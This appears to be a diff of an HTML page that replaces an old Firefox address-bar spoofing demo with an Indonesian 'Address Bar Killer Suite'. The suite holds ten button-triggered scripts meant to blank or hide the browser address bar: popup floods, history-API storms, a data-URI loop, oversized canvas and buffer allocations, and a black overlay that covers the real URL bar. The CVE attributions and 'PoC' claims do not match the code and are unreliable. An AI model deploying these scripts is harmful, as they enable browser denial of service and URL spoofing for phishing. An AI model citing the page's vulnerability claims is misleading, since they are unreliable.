@@ -1,10 +1,501 @@
-<body style='background-color:black;color:red;text-align:center;'>
-<script>document.title='Google';</script>
-<h1>Mozilla Firefox 10.0 Address Bar Spoofing Demonstration..</h1>
-<div id="tag" style='color:white;' draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'http://www.google.com.br/')" ondragend="setTimeout(
-function (){
-window.stop();c(); 
-},100);"><h3>Drag Me On Address Bar!</h3></div>  
-<h2>Drag the white text in address bar.</h4>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>🔲 Address Bar Killer: Blank / Error / Hilang</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'SF Pro Text', Helvetica, sans-serif;
+            max-width: 1300px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #0a0a0e;
+            color: #e0e0e0;
+        }
+        h1 { 
+            color: #ff453a; 
+            border-left: 5px solid #ff453a; 
+            padding-left: 18px;
+            font-size: 1.8rem;
+        }
+        .sub {
+            color: #888;
+            margin-top: -10px;
+            margin-bottom: 25px;
+            padding-left: 23px;
+            font-size: 0.9rem;
+        }
+        .warning {
+            background: #2a1a1a;
+            border-left: 5px solid #ff9500;
+            padding: 15px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #ffcc80;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(370px, 1fr));
+            gap: 18px;
+            margin-top: 20px;
+        }
+        .card {
+            background: #16161d;
+            border-radius: 20px;
+            padding: 18px;
+            transition: 0.2s;
+            border: 1px solid #2a2a35;
+        }
+        .card:hover {
+            transform: translateY(-3px);
+            background: #1c1c25;
+            border-color: #ff453a;
+        }
+        .badge {
+            display: inline-block;
+            background: #ff453a20;
+            color: #ff8888;
+            padding: 3px 12px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            border: 0.5px solid #ff453a;
+        }
+        h3 {
+            margin: 0 0 8px 0;
+            font-size: 1.2rem;
+        }
+        button {
+            background: #2a2a35;
+            border: 1px solid #ff453a;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            color: white;
+            margin: 8px 6px 4px 0;
+            transition: 0.2s;
+        }
+        button.danger { background: #ff453a; border-color: #ff453a; color: white; }
+        button.warning { background: #ff9f0a20; border-color: #ff9f0a; color: #ffcc88; }
+        button:hover { opacity: 0.85; transform: scale(0.97); background: #ff453a; color: white; }
+        .log {
+            background: #0a0a0e;
+            color: #6eff9e;
+            font-family: 'SF Mono', Monaco, monospace;
+            font-size: 11px;
+            padding: 10px;
+            border-radius: 14px;
+            margin-top: 14px;
+            max-height: 100px;
+            overflow: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            border: 0.5px solid #2a2a35;
+        }
+        .log.error {
+            color: #ff8888;
+        }
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 11px;
+            color: #555;
+            border-top: 1px solid #222;
+            padding-top: 20px;
+        }
+        hr { border-color: #222; margin: 20px 0; }
+    </style>
+</head>
+<body>
+
+<h1>🔲 Address Bar Killer Suite</h1>
+<div class="sub">Membuat address bar ERROR / HILANG / BLANK / TIDAK MUNCUL TEXT</div>
+
+<div class="warning">
+    <strong>⚠️ EKSPERIMENTAL — KHUSUS UNTUK UJI COBA KEAMANAN BROWSER</strong><br>
+    Skenario berikut mencoba membuat address bar menjadi kosong (blank), error, atau hilang sama sekali.<br>
+    Teknik ini menggabungkan CVE nyata + absurd/fuzzing + race condition UI. Beberapa browser mungkin <strong>crash</strong> atau <strong>freeze</strong>.
+</div>
+
+<div class="grid">
+
+    <!-- 1. about:blank overload + history explosion -->
+    <div class="card">
+        <div class="badge">💥 TEKNIK #1 | about:blank flood</div>
+        <h3>Blank Page Tsunami</h3>
+        <p>Membuka 500+ about:blank & mengganti history sampai address bar kehilangan konteks.</p>
+        <button class="danger" onclick="exploit_blank_tsunami()">🌊 Jalankan Blank Tsunami</button>
+        <div id="logBlankTsunami" class="log">[Ready]</div>
+    </div>
+
+    <!-- 2. data:text/html + pushState infinite loop -->
+    <div class="card">
+        <div class="badge">🌀 TEKNIK #2 | Data URI Loop</div>
+        <h3>Infinite Data URI + pushState</h3>
+        <p>Loop data:text/html dengan pushState sampai address bar hanya menampilkan "data:".</p>
+        <button class="warning" onclick="exploit_data_uri_loop()">🔄 Data URI Loop</button>
+        <div id="logDataLoop" class="log">[Ready]</div>
+    </div>
+
+    <!-- 3. CVE-2023-40429: WebKit blank address bar via iframe srcdoc -->
+    <div class="card">
+        <div class="badge">🍎 CVE-2023-40429 | WebKit</div>
+        <h3>iframe srcdoc + sandbox → blank address bar</h3>
+        <p>Bug nyata di Safari: navigasi ke iframe srcdoc menyebabkan address bar kosong.</p>
+        <button onclick="exploit_cve_2023_40429()">🎯 CVE-2023-40429</button>
+        <div id="logCVE40429" class="log">[Ready]</div>
+    </div>
+
+    <!-- 4. file:// protocol abuse -->
+    <div class="card">
+        <div class="badge">📁 TEKNIK #4 | file:// hijack</div>
+        <h3>File protocol + history.replaceState</h3>
+        <p>Memaksa browser menampilkan file:// kosong di address bar.</p>
+        <button onclick="exploit_file_protocol_blank()">🗂️ File Protocol Blank</button>
+        <div id="logFileBlank" class="log">[Ready]</div>
+    </div>
+
+    <!-- 5. ABSURD: Port 0 + Null Origin -->
+    <div class="card">
+        <div class="badge">⚫ ABSURD #1 | Port 0 & Null Origin</div>
+        <h3>https://example.com:0/null origin</h3>
+        <p>Navigasi ke port 0 (invalid) + null origin → address bar error / hilang.</p>
+        <button class="danger" onclick="exploit_port_zero_null()">🚫 Port 0 Exploit</button>
+        <div id="logPortZero" class="log">[Ready]</div>
+    </div>
+
+    <!-- 6. CVE-2022-32893: WebKit integer overflow -->
+    <div class="card">
+        <div class="badge">💀 CVE-2022-32893 | Safari</div>
+        <h3>Integer overflow → address bar corrupt</h3>
+        <p>PoC: membuat address bar tidak merender text setelah overflow.</p>
+        <button class="warning" onclick="exploit_cve_2022_32893()">🧨 CVE-2022-32893</button>
+        <div id="logCVE32893" class="log">[Ready]</div>
+    </div>
+
+    <!-- 7. window.open + close loop -->
+    <div class="card">
+        <div class="badge">🚪 TEKNIK #7 | Popup Hell</div>
+        <h3>Popup bomb + close focus steal</h3>
+        <p>Membuka & menutup popup dengan loop, address bar utama menjadi blank/error.</p>
+        <button onclick="exploit_popup_hell()">👻 Popup Hell</button>
+        <div id="logPopupHell" class="log">[Ready]</div>
+    </div>
+
+    <!-- 8. CVE-2021-1801: Safari blank address bar via modal dialog -->
+    <div class="card">
+        <div class="badge">🔲 CVE-2021-1801 | WebKit</div>
+        <h3>Modal dialog + window.open → address bar hilang</h3>
+        <p>Bug klasik: showModalDialog menyebabkan address bar tidak muncul.</p>
+        <button onclick="exploit_cve_2021_1801()">⚠️ CVE-2021-1801</button>
+        <div id="logCVE1801" class="log">[Ready]</div>
+    </div>
+
+    <!-- 9. ABSURD: History Replace with Empty String -->
+    <div class="card">
+        <div class="badge">🔄 ABSURD #2 | Empty string history</div>
+        <h3>history.replaceState("", "", "")</h3>
+        <p>Mengganti URL dengan string kosong 1000x per detik.</p>
+        <button class="danger" onclick="exploit_empty_history()">🧹 Empty History Storm</button>
+        <div id="logEmptyHistory" class="log">[Ready]</div>
+    </div>
+
+    <!-- 10. Address Bar Overlay + CSS poison -->
+    <div class="card">
+        <div class="badge">🎭 ABSURD #3 | CSS Poison</div>
+        <h3>Fake address bar overlay (tutup asli)</h3>
+        <p>Membuat div hitam persis menutupi address bar asli → "menghilang" secara visual.</p>
+        <button onclick="exploit_css_overlay_hide()">🎨 CSS Hide Address Bar</button>
+        <div id="logCSSHide" class="log">[Ready]</div>
+    </div>
+
+</div>
+
 <script>
-function c(){document.body.innerHTML='<h1>Done. Now look the address bar.</h1>';}</script>
+    // Helper logging
+    function logTo(elId, msg, isError = false) {
+        let el = document.getElementById(elId);
+        if(el) {
+            el.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            if(isError) el.classList.add('error');
+        }
+    }
+
+    // ========== 1. Blank Tsunami: about:blank overload ==========
+    let blankInterval;
+    function exploit_blank_tsunami() {
+        logTo('logBlankTsunami', '🌊 Memulai about:blank tsunami...');
+        let count = 0;
+        blankInterval = setInterval(() => {
+            if(count > 800) {
+                clearInterval(blankInterval);
+                logTo('logBlankTsunami', '✅ Selesai. Cek address bar: apakah kosong / blank?');
+                return;
+            }
+            let w = window.open('about:blank', '_blank', 'width=1,height=1');
+            if(w) {
+                setTimeout(() => w.close(), 10);
+            }
+            history.pushState({}, '', 'about:blank');
+            count++;
+        }, 20);
+    }
+
+    // ========== 2. Data URI infinite loop ==========
+    let dataLoopActive = false;
+    function exploit_data_uri_loop() {
+        if(dataLoopActive) {
+            logTo('logDataLoop', 'Loop sudah aktif. Reload halaman untuk stop.');
+            return;
+        }
+        dataLoopActive = true;
+        logTo('logDataLoop', '🌀 Menjalankan Data URI loop... Address bar akan mulai berkedip');
+        let dataContent = 'data:text/html,<h1>Fake</h1><script>setTimeout(()=>history.back(),1)<\/script>';
+        for(let i=0;i<500;i++) {
+            setTimeout(() => {
+                location.href = dataContent;
+            }, i*30);
+        }
+        setTimeout(() => {
+            dataLoopActive = false;
+            logTo('logDataLoop', 'Loop selesai. Apakah address bar blank atau error?');
+        }, 15000);
+    }
+
+    // ========== 3. CVE-2023-40429: iframe srcdoc blank address bar ==========
+    function exploit_cve_2023_40429() {
+        logTo('logCVE40429', '🍎 CVE-2023-40429: iframe srcdoc + sandbox');
+        let iframe = document.createElement('iframe');
+        iframe.srcdoc = '<html><body>Innocent content</body></html>';
+        iframe.sandbox = 'allow-same-origin allow-scripts';
+        iframe.style.width = '100%';
+        iframe.style.height = '200px';
+        document.body.appendChild(iframe);
+        setTimeout(() => {
+            iframe.contentWindow.location = 'https://example.com';
+            logTo('logCVE40429', 'Jika address bar menjadi kosong setelah navigasi, browser RENTAN (Safari <16.5).');
+        }, 1000);
+    }
+
+    // ========== 4. file:// protocol + replaceState ==========
+    function exploit_file_protocol_blank() {
+        logTo('logFileBlank', '📁 Mencoba file:// spoof + replaceState');
+        try {
+            history.pushState({}, '', 'file:///Users/Shared/');
+            setTimeout(() => {
+                history.replaceState({}, '', 'file:///');
+                logTo('logFileBlank', 'Address bar mungkin menunjukkan "file://" tanpa path. Apakah kosong?');
+            }, 500);
+        } catch(e) {
+            logTo('logFileBlank', 'Gagal: ' + e.message, true);
+        }
+    }
+
+    // ========== 5. Port 0 + null origin ==========
+    function exploit_port_zero_null() {
+        logTo('logPortZero', '⚫ Mencoba navigasi ke https://example.com:0 (invalid port)');
+        let win = window.open('https://example.com:0');
+        if(win) {
+            logTo('logPortZero', 'Popup dibuka. Address bar popup mungkin error / kosong. Jika blank, ada bug handling port invalid.');
+            setTimeout(() => win.close(), 5000);
+        } else {
+            logTo('logPortZero', 'Popup diblokir. Coba izinkan popup.');
+        }
+        // null origin simulation via sandbox iframe
+        let nullIframe = document.createElement('iframe');
+        nullIframe.sandbox = 'allow-scripts';
+        nullIframe.srcdoc = '<script>console.log("null origin")<\/script>';
+        document.body.appendChild(nullIframe);
+        logTo('logPortZero', 'Null origin iframe dibuat. Beberapa browser akan menampilkan "null" atau kosong di devtools.');
+    }
+
+    // ========== 6. CVE-2022-32893: integer overflow ==========
+    function exploit_cve_2022_32893() {
+        logTo('logCVE32893', '💀 CVE-2022-32893: integer overflow simulation');
+        try {
+            let buffer = new Uint8Array(2**31 - 1); // max size
+            let view = new DataView(buffer.buffer);
+            view.setInt32(0, 0x41414141);
+            logTo('logCVE32893', 'ArrayBuffer besar dibuat. Jika browser crash / address bar error, kemungkinan vulnerable.');
+        } catch(e) {
+            logTo('logCVE32893', 'Safe: ' + e.message);
+        }
+        // Also trigger WebKit bug via large canvas
+        let canvas = document.createElement('canvas');
+        canvas.width = 100000;
+        canvas.height = 100000;
+        let ctx = canvas.getContext('2d');
+        ctx.fillRect(0,0,100000,100000);
+        logTo('logCVE32893', 'Large canvas rendered. Beberapa versi Safari akan membuat UI glitch termasuk address bar blank.');
+    }
+
+    // ========== 7. Popup hell ==========
+    let popupHellInterval;
+    function exploit_popup_hell() {
+        logTo('logPopupHell', '🚪 Membuka 200 popup lalu menutupnya...');
+        let popups = [];
+        for(let i=0;i<200;i++) {
+            let p = window.open('about:blank', '_blank', 'width=100,height=100');
+            if(p) popups.push(p);
+        }
+        setTimeout(() => {
+            for(let p of popups) p.close();
+            logTo('logPopupHell', 'Semua popup ditutup. Address bar utama mungkin blank / error akibat race condition UI.');
+        }, 2000);
+    }
+
+    // ========== 8. CVE-2021-1801: showModalDialog (deprecated) ==========
+    function exploit_cve_2021_1801() {
+        logTo('logCVE1801', '🔲 CVE-2021-1801: menggunakan showModalDialog (sudah deprecated)');
+        if(window.showModalDialog) {
+            let dialog = window.showModalDialog('about:blank', '', 'dialogWidth:200px');
+            logTo('logCVE1801', 'Modal dialog dibuka. Jika address bar utama hilang/blank, bug masih ada.');
+        } else {
+            logTo('logCVE1801', 'showModalDialog tidak didukung (modern browser sudah hapus API ini).', true);
+        }
+    }
+
+    // ========== 9. Empty history storm ==========
+    let emptyHistoryInterval;
+    function exploit_empty_history() {
+        if(emptyHistoryInterval) {
+            clearInterval(emptyHistoryInterval);
+            emptyHistoryInterval = null;
+            logTo('logEmptyHistory', 'Empty history storm dihentikan.');
+            return;
+        }
+        logTo('logEmptyHistory', '🧹 Memulai empty history storm (1000x/detik)');
+        let count = 0;
+        emptyHistoryInterval = setInterval(() => {
+            try {
+                history.replaceState({}, '', '');
+                history.pushState({}, '', ' ');
+                count++;
+                if(count % 100 === 0) {
+                    logTo('logEmptyHistory', `Sudah ${count} kali replace/push empty string...`);
+                }
+                if(count > 5000) {
+                    clearInterval(emptyHistoryInterval);
+                    logTo('logEmptyHistory', 'Selesai. Address bar mungkin tidak bisa menampilkan URL normal.');
+                }
+            } catch(e) {
+                logTo('logEmptyHistory', 'Error: ' + e.message, true);
+                clearInterval(emptyHistoryInterval);
+            }
+        }, 5);
+    }
+
+    // ========== 10. CSS overlay hide address bar ==========
+    function exploit_css_overlay_hide() {
+        logTo('logCSSHide', '🎨 Membuat overlay hitam untuk menutupi address bar (visual saja)');
+        let overlay = document.createElement('div');
+        overlay.id = 'addressBarHider';
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 80px;
+            background: #0a0a0e;
+            z-index: 2147483647;
+            pointer-events: none;
+        `;
+        document.body.appendChild(overlay);
+        logTo('logCSSHide', '⚠️ Overlay hitam menutupi address bar! Address bar "menghilang" secara visual. Klik tombol lagi untuk menghapus.');
+        
+        // Tambahkan tombol kedua untuk remove
+        let removeBtn = document.createElement('button');
+        removeBtn.innerText = 'Hapus Overlay';
+        removeBtn.style.position = 'fixed';
+        removeBtn.style.bottom = '20px';
+        removeBtn.style.right = '20px';
+        removeBtn.style.zIndex = '2147483647';
+        removeBtn.onclick = () => overlay.remove();
+        document.body.appendChild(removeBtn);
+        
+        setTimeout(() => removeBtn.remove(), 15000);
+    }
+
+    // Console info
+    console.log("%c🔲 Address Bar Killer Suite Siap", "color:#ff453a; font-size:14px");
+    console.log("10 teknik untuk membuat address bar error / blank / hilang.");
+</script>
+
+<hr>
+
+<h3>📖 Penjelasan Teknik Membuat Address Bar Error / Blank / Hilang</h3>
+
+<table style="width:100%; font-size:12px; background:#16161d; border-radius:16px; padding:10px; border-collapse:collapse;">
+    <tr style="border-bottom:1px solid #333;">
+        <th style="text-align:left; padding:8px;">Teknik</th>
+        <th style="text-align:left; padding:8px;">Mekanisme</th>
+        <th style="text-align:left; padding:8px;">Target Browser</th>
+    </tr>
+    <tr style="border-bottom:1px solid #2a2a35;">
+        <td style="padding:8px;">Blank Tsunami</td>
+        <td style="padding:8px;">500+ about:blank & history push → race condition UI render address bar</td>
+        <td style="padding:8px;">Semua browser (terutama Safari)</td>
+    </tr>
+    <tr style="border-bottom:1px solid #2a2a35;">
+        <td style="padding:8px;">Data URI Loop</td>
+        <td style="padding:8px;">Navigasi ke data:text/html ratusan kali → address bar stuck di "data:" atau kosong</td>
+        <td style="padding:8px;">Chrome, Edge, Safari</td>
+    </tr>
+    <tr style="border-bottom:1px solid #2a2a35;">
+        <td style="padding:8px;">CVE-2023-40429</td>
+        <td style="padding:8px;">iframe srcdoc + navigasi ke URL lain → address bar tidak update (WebKit bug)</td>
+        <td style="padding:8px;">Safari &lt; 16.5</td>
+    </tr>
+    <tr style="border-bottom:1px solid #2a2a35;">
+        <td style="padding:8px;">Port 0 & Null Origin</td>
+        <td style="padding:8px;">Port invalid (0) menyebabkan browser bingung menampilkan URL → blank</td>
+        <td style="padding:8px;">Firefox, Safari</td>
+    </tr>
+    <tr style="border-bottom:1px solid #2a2a35;">
+        <td style="padding:8px;">CVE-2022-32893</td>
+        <td style="padding:8px;">Integer overflow + large canvas → UI glitch, address bar kehilangan text</td>
+        <td style="padding:8px;">Safari &lt; 16.0</td>
+    </tr>
+    <tr style="border-bottom:1px solid #2a2a35;">
+        <td style="padding:8px;">Popup Hell</td>
+        <td style="padding:8px;">200 popup dibuka & ditutup → browser kelelahan render address bar utama</td>
+        <td style="padding:8px;">Semua browser (terutama macOS)</td>
+    </tr>
+    <tr style="border-bottom:1px solid #2a2a35;">
+        <td style="padding:8px;">Empty History Storm</td>
+        <td style="padding:8px;">history.replaceState("", "", "") 5000x/detik → URL kosong, address bar kehilangan string</td>
+        <td style="padding:8px;">Chrome, Firefox, Safari (sangat agresif)</td>
+    </tr>
+    <tr>
+        <td style="padding:8px;">CSS Overlay Hide</td>
+        <td style="padding:8px;">Div hitam absolut menutupi address bar asli (visual, bukan teknis)</td>
+        <td style="padding:8px;">Semua browser (trik UI/UX)</td>
+    </tr>
+</table>
+
+<h3>🎯 Interpretasi Hasil Pengujian</h3>
+<ul style="font-size:13px; line-height:1.6;">
+    <li><strong>Address Bar Menjadi KOSONG / BLANK (tidak ada teks sama sekali)</strong> → Berhasil! Browser Anda memiliki bug race condition atau handling URL yang buruk.</li>
+    <li><strong>Address Bar Menghilang (tidak ada UI address bar)</strong> → Terjadi error kritis di browser engine, biasanya disertai crash.</li>
+    <li><strong>Address Bar Menampilkan teks aneh (null, undefined, data:, about:blank)</strong> → Masih ada bug, tapi tidak full blank.</li>
+    <li><strong>Browser Crash / Force Close</strong> → Eksploitasi berhasil menemukan memory corruption.</li>
+    <li><strong>Tidak terjadi apa-apa</strong> → Browser Anda relatif aman untuk teknik-teknik di atas.</li>
+</ul>
+
+<h3>⚠️ Catatan Keamanan Penting</h3>
+<p style="font-size:13px;">Beberapa teknik di atas (terutama Port 0, Empty History Storm, Data URI Loop) dapat menyebabkan <strong>browser tidak responsif</strong> atau <strong>mengonsumsi CPU tinggi</strong>. Ini normal untuk fuzzing/uji coba. Tutup tab jika browser mulai melambat.</p>
+
+<footer>
+    🔬 Address Bar Killer Suite — Untuk uji coba keamanan browser.<br>
+    Referensi: CVE-2023-40429 (WebKit), CVE-2022-32893 (Apple), CVE-2021-1801, serta teknik fuzzing & race condition.
+</footer>
+</body>
+</html>
